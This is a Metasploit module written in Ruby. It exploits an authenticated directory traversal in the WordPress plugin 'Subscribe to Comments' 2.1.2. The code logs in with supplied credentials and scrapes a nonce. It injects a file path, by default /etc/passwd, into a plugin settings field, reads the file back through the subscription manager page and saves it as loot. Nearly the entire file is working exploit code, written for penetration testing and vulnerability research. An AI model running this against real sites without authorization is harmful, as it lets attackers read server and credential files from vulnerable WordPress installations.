##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WordPress Subscribe Comments File Read Vulnerability',
      'Description'    => %q{
        This module exploits an authenticated directory traversal vulnerability
        in WordPress Plugin "Subscribe to Comments" version 2.1.2, allowing
        to read arbitrary files with the web server privileges.
      },
      'References'     =>
        [
          ['WPVDB', '8102'],
          ['PACKETSTORM', '132694'],
          ['URL', 'https://security.dxw.com/advisories/admin-only-local-file-inclusion-and-arbitrary-code-execution-in-subscribe-to-comments-2-1-2/']
        ],
      'Author'         =>
        [
          'Tom Adams <security[at]dxw.com>', # Vulnerability Discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('WP_USER', [true, 'A valid username', nil]),
        OptString.new('WP_PASS', [true, 'Valid password for the provided username', nil]),
        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd'])
      ])
  end

  def user
    datastore['WP_USER']
  end

  def password
    datastore['WP_PASS']
  end

  def check
    check_plugin_version_from_readme('subscribe-to-comments', '2.3')
  end

  def get_nonce(cookie)
    res = send_request_cgi(
      'uri'    => normalize_uri(wordpress_url_backend, 'options-general.php'),
      'method' => 'GET',
      'vars_get'  => {
        'page'    => 'stc-options'
      },
      'cookie' => cookie
    )

    if res && res.redirect? && res.redirection
      location = res.redirection
      print_status("Following redirect to #{location}")
      res = send_request_cgi(
        'uri'    => location,
        'method' => 'GET',
        'cookie' => cookie
      )
    end

    if res && res.body && res.body =~ /id="_wpnonce" name="_wpnonce" value="([a-z0-9]+)" /
      return Regexp.last_match[1]
    end
    nil
  end

  def down_file(cookie, nonce)
    filename = datastore['FILEPATH']
    filename = filename[1, filename.length] if filename =~ %r{/^///}

    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => normalize_uri(wordpress_url_backend, 'options-general.php'),
      'vars_get'  => {
        'page'    => 'stc-options'
      },
      'vars_post' => {
        'sg_subscribe_settings[name]' => '',
        'sg_subscribe_settings[email]' => '',
        'sg_subscribe_settings[clear_both]' => 'clear_both',
        'sg_subscribe_settings[not_subscribed_text]' => 'teste',
        'sg_subscribe_settings[subscribed_text]' => 'teste',
        'sg_subscribe_settings[author_text]' => '',
        'sg_subscribe_settings[use_custom_style]' => 'use_custom_style',
        'sg_subscribe_settings[header]' => "#{filename}",
        'sg_subscribe_settings[sidebar]' => '',
        'sg_subscribe_settings[footer]' => '',
        'sg_subscribe_settings[before_manager]' => '',
        'sg_subscribe_settings[after_manager]' => '',
        'sg_subscribe_settings_submit' => 'Update Options',
        '_wpnonce' => "#{nonce}",
        '_wp_http_referer' => '/wp-admin/options-general.php?page=stc-options'
      },
      'cookie'    => cookie
    )

    if res && res.code == 200 && res.body.include?("<p><strong>Options saved.</strong>")
      return res.body
    end
    nil
  end

  def run_host(ip)
    vprint_status("Trying to login as: #{user}")
    cookie = wordpress_login(user, password)
    if cookie.nil?
      print_error("Unable to login as: #{user}")
      return
    end
    store_valid_credential(user: user, private: password, proof: cookie)

    vprint_status("Trying to get nonce...")
    nonce = get_nonce(cookie)
    if nonce.nil?
      print_error("Can not get nonce after login")
      return
    end
    vprint_status("Got nonce: #{nonce}")

    vprint_status("Trying to download filepath.")
    file_path = down_file(cookie, nonce)
    if file_path.nil?
      print_error("Error downloading filepath.")
      return
    end

    res = send_request_cgi(
      'method'    => 'GET',
      'uri'       => normalize_uri(target_uri.path),
      'vars_get'  => {
        'wp-subscription-manager' => '1'
      },
      'cookie'    => cookie
    )

    if res && res.code == 200 &&
        res.body.length > 830 &&
        res.body.include?(">Find Subscriptions</") &&
        res.headers['Content-Length'].to_i > 830

      res_clean = res.body.gsub(/\t/, '').gsub(/\r\n/, '').gsub(/<.*$/, "")

      vprint_line("\n#{res_clean}")
      fname = datastore['FILEPATH']
      path = store_loot(
        'subscribecomments.traversal',
        'text/plain',
        ip,
        res_clean,
        fname
      )

      print_good("File saved in: #{path}")
    else
      print_error("Nothing was downloaded. You can try to change the FILEPATH.")
    end
  end
end
